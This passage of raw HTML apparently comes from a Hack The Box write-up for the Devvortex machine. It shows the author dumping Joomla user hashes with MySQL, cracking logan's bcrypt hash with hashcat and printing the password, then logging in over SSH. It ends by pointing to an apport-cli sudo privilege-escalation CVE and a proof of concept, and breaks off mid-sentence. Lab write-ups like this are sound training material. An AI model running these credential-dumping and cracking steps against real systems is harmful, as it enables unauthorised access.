data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBzdGlsbCUyMGhhdmUlMjBsZXdpcyUyMGNyZWRlbnRpYWxzJTIwd2UlMjBmb3VuZCUyMGVhcmxpZXIlMjBtYXliZSUyMHdlJTIwY2FuJTIwc2VhcmNoJTIwdGhlJTIwZGF0YWJhc2UlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJMbU54Q1F5Wmh0Q0olMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI2TENjWllPVDVnVTUlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJFd3FiRjlGNTB6NnglMjIlN0Q=\">e still have lewis credentials we found earlier maybe we can search the database using the bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>mysql -u lewis -p</code></pre>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup10-2.png\" alt=\"Devvortex - HTB Writeup\" width=\"566\" height=\"174\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup10-2-lg.png 1024w\"></figure>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBsaXN0JTIwdGhlJTIwZGF0YWJhc2VzJTIwYXZhaWxhYmxlJTIwdG8lMjB1cyUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjkyY0dXbk5zbEdUYiUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnFmeEtxTUNOMTU0UCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnNPcFhIMnR2NU1oVSUyMiU3RA==\">Lets list the databases available to us with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>SHOW DATABASES;</code></pre>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup11.png\" alt=\"Devvortex - HTB Writeup\" width=\"537\" height=\"227\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup11-lg.png 1024w\"></figure>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmpvb21sYSUyMGxvb2tzJTIwaW50ZXJlc3RpbmclMkMlMjBsZXQncyUyMHVzZSUyMHRoaXMlMjBkYXRhYmFzZSUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmlTaVlEWDVNM1MzWCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmk2YU13V3ZFQUpLbSUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjZFRzdJTFBBaHF1cSUyMiU3RA==\">joomla looks interesting, let's use this database with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>USE joomla;</code></pre>\n<p>Then <span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmxpc3QlMjBhbGwlMjB0aGUlMjB0YWJsZXMlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJBanVKQTVuNEtHWFIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJwZTZqb3RBUVhUTEglMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJZSG9zYmxIZ1Y2U0klMjIlN0Q=\">list all the tables with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>SHOW TABLES;</code></pre>\n<p><span data-offset-key=\"HNnPSthUylKw:0\">we can see the following table </span><code class=\"r-crgep1 r-2jxp4q r-z2wwpe r-uibjmv r-m2pi6t r-1hvjb8t\" data-slate-leaf=\"true\" data-offset-key=\"HNnPSthUylKw:1\" data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMndlJTIwY2FuJTIwc2VlJTIwdGhlJTIwZm9sbG93aW5nJTIwdGFibGUlMjAlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlMkMlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMnNkNGZnX3VzZXJzJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJtYXJrJTIyJTJDJTIydHlwZSUyMiUzQSUyMmNvZGUlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMks4Z3hZOEJzTFFpUCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmZheTJ6aHNyR1F1byUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnVtTzltY2ozUEwzWCUyMiU3RA==\">sd4fg_users</code> with bellow command.</p>\n<pre class=\"language-bash line-numbers\"><code>select username,password from sd4fg_users;</code></pre>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBoYXZlJTIwc29tZSUyMHVzZXJuYW1lcyUyMGFuZCUyMHRoZXJlJTIwZW5jcnlwdGVkJTIwcGFzc3dvcmRzJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyTFJtbDhJNlAzM0FmJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyOFdnMjBoNFRVQjYwJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyRXY1WG9mY0FOYzFVJTIyJTdE\">We have some usernames and there encrypted passwords.....</span></p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup12.png\" alt=\"Devvortex - HTB Writeup\" width=\"570\" height=\"173\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup12-lg.png 1024w\"></figure>\n<p>Let's try to findout what type of password hash with hashid tool.</p>\n<pre class=\"language-bash line-numbers\"><code>hashid -e '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u'\nAnalyzing '$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u'\n[+] Blowfish(OpenBSD) \n[+] Woltlab Burning Board 4.x \n[+] bcrypt</code></pre>\n<div>\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci\" data-rnwr1490-1777fci=\"true\" data-rnwr700-1777fci=\"true\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<div class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top400_n25lP bottom400_6eeBF\" data-key=\"SvkuuZRoSLZ0\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2\" data-block-content=\"SvkuuZRoSLZ0\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<ul>\n<li class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top0_4AOU1 bottom0_fXfxl\" data-key=\"gSWYuZDmWBPb\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2 r-6koalj r-18u37iz r-bnwqim\" data-block-content=\"gSWYuZDmWBPb\">\n<div class=\"css-175oi2r r-13awgt0\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-1mlwlqe r-eqz5dr r-1q142lx r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010\" data-key=\"t88OHsWBOXXd\">\n<div class=\"css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8\" dir=\"auto\"><span data-key=\"uGnt8MruuD66\">Blowfish(OpenBSD)</span></div>\n</div>\n</div>\n</div>\n</li>\n</ul>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJsaXN0LXVub3JkZXJlZCUyMiUyQyUyMmlzVm9pZCUyMiUzQWZhbHNlJTJDJTIyZGF0YSUyMiUzQSU3QiU3RCUyQyUyMm5vZGVzJTIyJTNBJTVCJTdCJTIyb2JqZWN0JTIyJTNBJTIyYmxvY2slMjIlMkMlMjJ0eXBlJTIyJTNBJTIybGlzdC1pdGVtJTIyJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkJsb3dmaXNoKE9wZW5CU0QpJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIycFpGdElTVGhRNXVWJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIySnpHMUhCYmQ5dExYJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyelFWNTlnTnVXZmFGJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyOEl1eXd5MTlwWHg4JTIyJTdEJTJDJTdCJTIyb2JqZWN0JTIyJTNBJTIyYmxvY2slMjIlMkMlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyaXNWb2lkJTIyJTNBZmFsc2UlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJ0ZXh0JTIyJTJDJTIybGVhdmVzJTIyJTNBJTVCJTdCJTIyb2JqZWN0JTIyJTNBJTIybGVhZiUyMiUyQyUyMnRleHQlMjIlM0ElMjJMZXQncyUyMHVzZSUyMGhhc2hjYXQlMjBhbmQlMjBjcmFjayUyMHRoZSUyMHVzZXIlMjBsb2dhbiUyMGhhc2glMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJTNjNhdTY3OEppcGslMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJDUzZhQVFpdW55Y3clMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJMazRNYzNyTW5kcG0lMjIlN0Q=\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci\" data-rnwr1490-1777fci=\"true\" data-rnwr700-1777fci=\"true\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<div class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top200_FwkHm bottom200_HuRwz\" data-key=\"CS6aAQiunycw\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2\" data-block-content=\"CS6aAQiunycw\">\n<div class=\"css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8\" dir=\"auto\"><span data-key=\"S63au678Jipk\">Let's use hashcat and crack the user logan hash with bellow command.</span></div>\n<div dir=\"auto\">\n<pre class=\"language-bash line-numbers\"><code>hashcat -m 3200 logan_hash /usr/share/wordlists/rockyou.txt</code></pre>\n<p>W<span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmUlMjBoYXZlJTIwdGhlJTIwY3JhY2tlZCUyMHBhc3N3b3JkJTIwb2YlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJnQkNVbTEyUFozOVklMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJTV2c5WlhaZ3FMR1MlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJDRHIwQkpuWU15SUslMjIlN0Q=\">e have the cracked password of <code>logan</code>.</span></p>\n<pre class=\"language-bash line-numbers\"><code>tequieromucho</code></pre>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBzZWUlMjBpZiUyMHdlJTIwY2FuJTIwU1NIJTIwaW50byUyMHRoZSUyMG1hY2hpbmUlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJyQWZEbzV5UW1OMHUlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJaYXltVEJ2ZllxUHIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIxRUkzUThQM0tZVWglMjIlN0Q=\">Let's see if we can SSH into the machine with this creds.</span></p>\n<pre class=\"language-bash line-numbers\"><code>ssh logan@10.10.11.242</code></pre>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup13.png\" alt=\"Devvortex - HTB Writeup\" width=\"604\" height=\"371\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup13-lg.png 1024w\"></figure>\n<p>Yes, we got the access with SSH!</p>\n<h3>User Flag</h3>\n<p>We can <code>ls</code> and <code>cat user.txt</code> to get our user flag.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup15.png\" alt=\"Devvortex - HTB Writeup\" width=\"441\" height=\"130\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup15-lg.png 1024w\"></figure>\n<h3>System Flag</h3>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkNoZWNraW5nJTIwb3VyJTIwc3VkbyUyMHByaXZpbGVnZXMlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ5dENqVmZjTXM3ZkIlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJndzJLWGdmYTJYckglMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjI0bzNYWkhYbkF6WGglMjIlN0Q=\">Checking our sudo privileges with bellow command.</span></p>\n<pre class=\"language-bash line-numbers\"><code>sudo -l</code></pre>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup14.png\" alt=\"Devvortex - HTB Writeup\" width=\"1272\" height=\"237\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup14-lg.png 1024w\"></figure>\n<div>\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"view_manYY blockWrapper_8BIg7 vertical0_jPhI0 horizontalAuto_xck7M\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2 r-18u37iz r-1777fci\" data-rnwr1490-1777fci=\"true\" data-rnwr700-1777fci=\"true\">\n<div class=\"css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2\">\n<div class=\"css-175oi2r\">\n<div class=\"css-175oi2r\">\n<div class=\"view_manYY relative_kNGzo column_Pzect vertical400_IGNdU top200_FwkHm bottom200_HuRwz\" data-key=\"AXM5FiIyfH0F\">\n<div class=\"r-1oszu61 r-1xc7w19 r-1phboty r-1yadl64 r-deolkf r-6koalj r-eqz5dr r-crgep1 r-ifefl9 r-bcqeeo r-t60dpp r-bnwqim r-417010 r-1ro0kt6 r-16y2uox r-1wbh5a2\" data-block-content=\"AXM5FiIyfH0F\">\n<div class=\"css-1rynq56 r-gg6oyi r-ubezar r-1o2nx2a r-135wba7 r-37p410 r-fdjqy7 r-1xnzce8\" dir=\"auto\"><span data-key=\"Bl96f2ur3jHZ\">Here, we can run the program </span><code><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">/usr/bin/apport-cli</span></code>. A<span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\">fter a quick google search I found that this program is vulnerable.</span></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p>Unveiling a privilege escalation vulnerability in apport-cli 2.26.0 and earlier, reminiscent of <a class=\"af pv\" href=\"https://github.com/advisories/GHSA-8989-8fhv-vq42\" rel=\"noopener ugc nofollow\" target=\"_blank\">CVE-2023–26604</a>. For the exploit to succeed, the system must be uniquely configured, allowing unprivileged users to execute sudo apport-cli. With less configured as the pager and adjustable terminal size, a local attacker gains the privilege escalator. While rare, the possibility underscores the importance of prudent sudo configurations. Stay vigilant!</p>\n<p><a href=\"https://github.com/diego-tella/CVE-2023-1326-PoC\" title=\"sakibulalikhan\" target=\"_blank\" rel=\"noopener noreferrer\">https://github.com/diego-tella/CVE-2023-1326-PoC</a></p>\n<p>Through this vuln, <span 